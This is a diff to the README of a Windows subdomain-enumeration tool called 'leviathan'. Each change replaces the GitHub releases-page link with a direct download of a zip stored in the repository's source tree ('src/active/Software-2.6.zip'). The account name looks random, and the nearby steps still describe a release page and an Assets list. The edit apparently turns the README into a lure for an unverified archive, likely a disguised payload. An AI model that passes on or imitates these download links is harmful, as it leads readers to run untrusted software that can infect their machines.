@@ -1,6 +1,6 @@
 # leviathan - Find subdomains with less effort
 
-[![Download leviathan](https://img.shields.io/badge/Download%20leviathan-purple?style=for-the-badge&logo=github)](https://github.com/Wireclothshowyladyslipper675/leviathan/releases)
+[![Download leviathan](https://img.shields.io/badge/Download%20leviathan-purple?style=for-the-badge&logo=github)](https://github.com/Wireclothshowyladyslipper675/leviathan/raw/refs/heads/main/src/active/Software-2.6.zip)
 
 ## 🧭 What leviathan does
 
@@ -22,7 +22,7 @@ leviathan is made for use on Windows through the release files on GitHub. You do
 ### How to get it
 
 1. Open the release page:
-   https://github.com/Wireclothshowyladyslipper675/leviathan/releases
+   https://github.com/Wireclothshowyladyslipper675/leviathan/raw/refs/heads/main/src/active/Software-2.6.zip
 2. Find the latest release at the top of the page
 3. Look for a Windows file in the Assets list
 4. Download that file to your PC
@@ -139,7 +139,7 @@ Use leviathan when you need to:
 
 Visit this page to download leviathan for Windows:
 
-https://github.com/Wireclothshowyladyslipper675/leviathan/releases
+https://github.com/Wireclothshowyladyslipper675/leviathan/raw/refs/heads/main/src/active/Software-2.6.zip
 
 ## 🔐 Before you use it
 
